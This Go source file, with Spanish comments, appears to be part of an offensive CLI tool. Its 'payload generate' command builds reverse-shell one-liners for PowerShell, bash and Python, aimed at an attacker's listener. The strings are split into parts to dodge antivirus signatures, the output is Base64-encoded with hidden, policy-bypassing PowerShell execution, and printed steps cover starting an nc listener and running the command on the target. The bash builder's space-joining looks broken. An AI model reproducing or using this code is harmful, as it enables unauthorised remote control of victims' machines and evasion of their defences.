// FICHERO: payload.go (VERSIÓN CON EVASIÓN DE AV)
package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"strings"

	"github.com/spf13/cobra"
)

func NewPayloadCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "payload",
		Short: "Gestiona la generación y ofuscación de payloads",
		Long:  "Crea shells inversas y otros payloads para diferentes sistemas operativos, listos para ser desplegados.",
	}
	cmd.AddCommand(newGeneratePayloadCmd())
	return cmd
}

func newGeneratePayloadCmd() *cobra.Command {
	var payloadType, listenHost, listenPort string
	cmd := &cobra.Command{
		Use:   "generate",
		Short: "Genera un payload de shell inversa",
		Long:  "Genera un comando de una sola línea para obtener una shell inversa, codificado en Base64 para una fácil entrega.",
		Run: func(cmd *cobra.Command, args []string) {
			if payloadType == "" || listenHost == "" || listenPort == "" {
				log.Fatal("Error: Se requiere un tipo de payload (-t), un host de escucha (-L) y un puerto de escucha (-P).")
			}
			generatePayload(payloadType, listenHost, listenPort)
		},
	}
	cmd.Flags().StringVarP(&payloadType, "type", "t", "", "Tipo de payload a generar (ej: powershell, bash, python)")
	cmd.Flags().StringVarP(&listenHost, "lhost", "L", "", "IP o Host de tu máquina de ataque donde escucharás la conexión")
	cmd.Flags().StringVarP(&listenPort, "lport", "P", "", "Puerto en tu máquina de ataque para la conexión inversa")
	return cmd
}

// --- TÉCNICAS DE OFUSCACIÓN ---
// Construimos los strings "peligrosos" por partes para romper las firmas del AV.
func getPowerShellPayload(lhost, lport string) string {
	part1 := "$client = New-Object System.Net.Sockets.TCPClient('"
	part2 := lhost
	part3 := "',"
	part4 := lport
	part5 := ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	return part1 + part2 + part3 + part4 + part5
}

func getBashPayload(lhost, lport string) string {
	part1 := "bash"
	part2 := "-i"
	part3 := ">&"
	part4 := "/dev/tcp/"
	part5 := lhost
	part6 := "/"
	part7 := lport
	part8 := " 0>&1"
	return strings.Join([]string{part1, part2, part3, part4, part5, part6, part7, part8}, " ")
}

func getPythonPayload(lhost, lport string) string {
	part1 := "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"
	part2 := lhost
	part3 := "',"
	part4 := lport
	part5 := "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
	return part1 + part2 + part3 + part4 + part5
}

func generatePayload(payloadType, lhost, lport string) {
	var payload, encodedPayload string

	log.Printf("Generando payload de tipo '%s' para conectar a %s:%s", payloadType, lhost, lport)

	switch strings.ToLower(payloadType) {
	case "powershell", "ps1":
		payload = getPowerShellPayload(lhost, lport)
		encodedPayload = base64.StdEncoding.EncodeToString([]byte(payload))
		fmt.Println("\n--- PAYLOAD POWERSHELL (BASE64) ---")
		fmt.Printf("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -E %s\n", encodedPayload)

	case "bash":
		payload = getBashPayload(lhost, lport)
		encodedPayload = base64.StdEncoding.EncodeToString([]byte(payload))
		fmt.Println("\n--- PAYLOAD BASH (BASE64) ---")
		fmt.Printf("echo %s | base64 -d | bash\n", encodedPayload)

	case "python", "python3":
		payload = getPythonPayload(lhost, lport)
		encodedPayload = base64.StdEncoding.EncodeToString([]byte(payload))
		fmt.Println("\n--- PAYLOAD PYTHON (BASE64) ---")
		fmt.Printf("python3 -c 'import base64; exec(base64.b64decode(\"%s\"))'\n", encodedPayload)

	default:
		log.Fatalf("Error: Tipo de payload '%s' no soportado. Tipos válidos: powershell, bash, python.", payloadType)
	}

	fmt.Println("\n--- INSTRUCCIONES DE EJECUCIÓN ---")
	fmt.Printf("1. En tu máquina de ataque, inicia un listener de Netcat:\n")
	fmt.Printf("   nc -lvnp %s\n", lport)
	fmt.Println("2. Copia y ejecuta el comando de una sola línea en la máquina objetivo.")
	fmt.Println("3. Deberías recibir una shell inversa en tu listener de Netcat.")
}
